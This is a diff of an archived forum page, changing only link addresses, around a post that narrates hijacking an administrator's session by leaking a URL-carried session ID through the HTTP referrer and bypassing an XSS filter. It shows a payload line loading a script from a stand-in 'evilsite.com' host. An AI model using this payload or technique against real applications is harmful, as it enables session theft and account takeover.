@@ -79,12 +79,12 @@ The application dint used any cookies instead it used a session ID , which was p
 	<div class="bbcode_description">Code:</div>
 	<hr/><code class="bbcode_code">http://site.com/usrpage/?userid={D8A349A7-3503-4283-A1AA-9406DB6EE9C5}</code><hr/>
 </div>So what strike me was, as that the user session Id hold the authentication and if I could get hold of another valid session I could be in that user privileges. And the only possible way is by tracking the HTTP_REFERRER value. And this could be only possible by making the administrator/manager clicking one of our links form the application. And then we could Hijack the user session. For those who are not aware of what am talking about, read a similar scenario .<br/>
-<a href="../external.html?link=http://fb1h2s.com/view.php?article_id=8" target="_blank">http://fb1h2s.com/view.php?article_id=8</a><br/>
+<a href="http://fb1h2s.com/view.php?article_id=8" target="_blank">http://fb1h2s.com/view.php?article_id=8</a><br/>
 <br/>
 In order to achieve that, I need to find an XSS in the section where I could post my data for the manager approval  or if managed to send a Hyperlink which when clicked, "boomed" my back end program will store the SessionIds. <br/>
 But with the current filter which is blocking all unwanted request it was hardly possible.<br/>
 <br/>
- And I was all stuck at this part, I even tried out all the XSS bypass stuff in <a href="../external.html?link=http://ha.ckers.org/xss.html" target="_blank">http://ha.ckers.org/xss.html</a> and none worked for me, and at that time VInay "vinnu" bro was online and was all ready for help :). I presented my scenario of the Filter and that I want to bypass that he gave me few cool tips , in which converting the Payload string that was a hyper link <br/>
+ And I was all stuck at this part, I even tried out all the XSS bypass stuff in <a href="http://ha.ckers.org/xss.html" target="_blank">http://ha.ckers.org/xss.html</a> and none worked for me, and at that time VInay "vinnu" bro was online and was all ready for help :). I presented my scenario of the Filter and that I want to bypass that he gave me few cool tips , in which converting the Payload string that was a hyper link <br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
 	<hr/><code class="bbcode_code">&lt;link href="http://evilsite.com/evilscript.py" /&gt;</code><hr/>
@@ -381,7 +381,7 @@ I like one thing very much and that is when you say "Woot Woot"...........</bloc
 
 <div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
 <div class="footer_morecopyright" id="footer_morecopyright">
